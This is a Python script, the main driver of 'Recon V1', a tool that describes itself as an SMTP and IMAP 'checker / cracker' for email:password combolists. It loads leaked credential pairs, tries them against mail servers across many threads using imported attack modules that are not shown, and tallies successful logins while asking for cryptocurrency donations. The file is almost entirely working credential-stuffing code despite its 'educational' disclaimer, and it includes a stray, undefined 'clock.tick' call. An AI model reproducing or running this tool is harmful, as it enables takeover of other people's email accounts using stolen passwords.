#!/usr/local/opt/python@3.8/bin/python3
# -*- coding: utf-8 -*-


'''

██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗    ██╗   ██╗ ██╗
██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║    ██║   ██║███║
██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║    ██║   ██║╚██║
██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║    ╚██╗ ██╔╝ ██║
██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║     ╚████╔╝  ██║
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═╝ 
         ----------------------------------------

                  *** LEGAL NOTICES ***
                   *** DISCLAIMER ***

The information and/or software provided here is intended solely
for educational purposes and legal penetration testing purposes. 
By accessing or using this information and/or software, you 
acknowledge and agree that you assume full responsibility for your
actions and any consequences that may result from those actions. 
The creators, contributors, and providers of this information 
and/or software shall not be held liable for any misuse or damage
arising from its application. It is your responsibility to ensure 
that your use complies with all applicable laws and regulations. 
This applies to all cases of usage, no matter whether the code as 
a whole or just parts of it are being used.

                   *** SHORT INFO ***

SMTP and IMAP Checker / Cracker for Email:Pass Combolists.
Further Information and Help at:

          https://github.com/noarche/Imap-Recon
'''

# [IMPORTS]
# ---------

import sys
import threading
import inc_attackimap as ic
import inc_attacksmtp as sc
from queue import Queue
from time import sleep
from inc_comboloader import comboloader
from inc_etc import clean
from inc_etc import get_combofile_nogui

# [VARIOUS]
# ---------

main_logo = '''

██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗    ██╗   ██╗ ██╗
██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║    ██║   ██║███║
██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║    ██║   ██║╚██║
██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║    ╚██╗ ██╔╝ ██║
██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║     ╚████╔╝  ██║
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═╝                                                            
          **********************
          Build 1.1 April 7 2024
          **********************
    https://github.com/noarche/Imap-Recon
    
    Tip or donate for faster development:

    (BTC) address bc1qnpjpacyl9sff6r4kfmn7c227ty9g50suhr0y9j
    (ETH) address 0x94FcBab18E4c0b2FAf5050c0c11E056893134266
    (LTC) address ltc1qu7ze2hlnkh440k37nrm4nhpv2dre7fl8xu0egx

'''

# global variables and stuff:
targets_total = int(0)
targets_left = int(0)
hits = int(0)
fails = int(0)

checker_queue = Queue()

# [FUNCTIONS]
# -----------

def checker_thread(checker_type, default_timeout, default_email):
    '''
    Function for a single thread which performs the main checking process.

    :param str checker_type: smtp or imap
    :param float default_timeout: timeout for server connection
    :param str default_email: user's email for test messages (SMTP only)
    :return: None
    '''
    # set variables:
    global targets_left
    global hits
    global fails
    # start thread for chosen checker type:
    while True:
        target = str(checker_queue.get())
        result = False
        try:
            if checker_type == 'smtp':
                result = sc.smtpchecker(
                    float(default_timeout),
                    str(default_email),
                    str(f'{target}')
                )
            elif checker_type == 'imap':
                result = ic.imapchecker(
                    float(default_timeout),
                    str(f'{target}')
                )
        except:
            pass
        # update stats:
        if result == True:
            hits += 1
        else:
            fails += 1
        targets_left -= 1
        checker_queue.task_done()
    # cooldown for checker thread:
    sleep(3.0)
    return None

def checker(checker_type, default_threads, default_timeout, default_email, combofile):
    '''
    Function to control the import of combos, to start threads etc.

    :param str checker_type: smtp or imap
    :param int default_threads: amount of threads to use
    :param float default_timeout: timeout for server-connections
    :param str default_email: users's email for test-messages (SMTP only)
    :param str combofile: textfile with combos to import
    :return: True (no errors occurred), False (errors occurred)
    '''
    # set variables:
    global targets_total
    global targets_left
    combos_available = False
    try:
        # load combos:
        print('Step#1: Loading combos from file ...')
        try:
            combos = comboloader(combofile)
        except:
            combos = []
        targets_total = len(combos)
        targets_left = targets_total
        if targets_total > 0:
            combos_available = True
            print(f'Done! Amount of combos loaded: {str(targets_total)}\n\n')
        else:
            print('Done! No combos loaded.\n\n')
        # start checker threads:
        if combos_available == True:
            print(f'Step#2: Starting threads for {checker_type} checker ...')
            for _ in range(default_threads):
                single_thread = threading.Thread(
                    target=checker_thread,
                    args=(str(f'{checker_type}'),default_timeout,default_email),
                    daemon=True
                )
                single_thread.start()
            # fill queue with combos:
            for target in combos:
                checker_queue.put(target)
            print('Done! Checker started and running - see stats in window title. L H F represents the number of Combos Left, Hits, and Failed attempts.n\n')
            # checker stats in window title:
            while targets_left > 0:
                try:
                    sleep(1.0)
                    titlestats = str(f'L:{str(targets_left)} # H:{str(hits)} # F:{str(fails)}')
                    sys.stdout.write('\33]0;' + titlestats + '\a')
                    sys.stdout.flush()
                except:
                    pass
            # finish checker:
            print('Step#3: Finishing checking ...')
            checker_queue.join()
            print('Done!\n\n')
            sleep(3.0)
        else:
            print('Press [ENTER] and try again, please!')
            input()
        clean()
        return True
    except:
        clean()
        return False

def main():
    '''
    Simple function for main menu and checker setup.

    :return: None
    '''
    # set default values for needed variables:
    default_timeout = float(3.0)
    default_threads = int(5)
    default_email = str('user@email.com')
    combofile = str('combos.txt')
    checker_type = str('smtp')
    clean()
    print(main_logo + '\n\n')
    # get values for variables from user input:
    try:
        # type of checking (SMTP / IMAP):
        checker_choice = int(
            input('Checker Type [1 = smtp or 2 = imap]: ')
        )
        if checker_choice == 2:
            checker_type = 'imap'
        if checker_choice == 1:
            # (SMTP only) user's email address for testmailer:
            default_email = str(
                input('Your Email [e.g. your@email.com]: ')
            )
        # threads to use:
        default_threads = int(
            input('\033[34mChecker Threads [e.g. 10]: \033[0m')
        )
        # default timeout for connections:
        default_timeout = float(
            input('\033[34mChecker Timeout in Seconds [e.g. 1.8]: \033[0m')
        )
        # start open-file-dialog using tkinter:
        combofile = get_combofile_nogui()
        # ask for starting the checker:
        start_now = str(
            input('\n\nStart Checker = [y] or Exit = [n]: \033[0m')
        )
        # start checker for option "yes":
        if start_now in ['y', 'Y', 'yes', 'Yes']:
            clean()
            print(
                '\n\n'
                + f'Recon V1 - running ({checker_type}) checker:\n'
                + 38*'-' + '\n\n'
                + f'user email: {default_email}\n'
                + f'threads:    {str(default_threads)}\n'
                + f'timeout:    {str(default_timeout)}\n\n'
                + 38*'-' + '\n'
            )
            print(
                'Tip or donate for faster development:\n\n'
                + '    (BTC) address bc1qnpjpacyl9sff6r4kfmn7c227ty9g50suhr0y9j\n'
                + '    (ETH) address 0x94FcBab18E4c0b2FAf5050c0c11E056893134266\n'
                + '    (LTC) address ltc1qu7ze2hlnkh440k37nrm4nhpv2dre7fl8xu0egx\n\n'
            )
            print('\033[34mPlease be patient and wait while all combos are being checked ...\n\n\033[0m')
            checker_result = checker(
                str(checker_type),
                int(default_threads),
                float(default_timeout),
                str(default_email),
                str(combofile)
            )
            # show summary and quit:
            if checker_result == True:
                print(
                    '\n\n'
                    + f'Recon V1 - ({checker_type}) checker results:\n'
                    + 38*'-' + '\n\n'
                    + f'combos:    {str(targets_total)}\n'
                    + f'hits:      {str(hits)}\n'
                    + f'fails:     {str(fails)}\n\n'
                    + 38*'-' + '\n'
                )
                print(
                    'Tip or donate for faster development:\n\n'
                + '    (BTC) address bc1qnpjpacyl9sff6r4kfmn7c227ty9g50suhr0y9j\n'
                + '    (ETH) address 0x94FcBab18E4c0b2FAf5050c0c11E056893134266\n'
                + '    (LTC) address ltc1qu7ze2hlnkh440k37nrm4nhpv2dre7fl8xu0egx\n\n'
                )
                print('Press [ENTER] to exit ...')
                input()
            else:
                clean()
                print(
                    '\n\n\n'
                    + '*** SORRY ***\n'
                    + 'Errors occurred while checking your combos! Running the checker failed.\n'
                    + 'Press [ENTER] to exit ...'
                )
                input()
                clean()
        # exit for option "no":
        elif start_now in ['n', 'N', 'no', 'No']:
            clean()
        else:
            clean()
            print('\n\n*** SORRY ***\nSomething went wrong. Press [ENTER] and try again, please!\n')
            input()
    except:
        clean()
        print('\n\n*** SORRY ***\nAn error occurred. Press [ENTER] and try again, please!\n')
        input()
    sys.exit()

    clock.tick(20)

# [MAIN]
# ------

main()

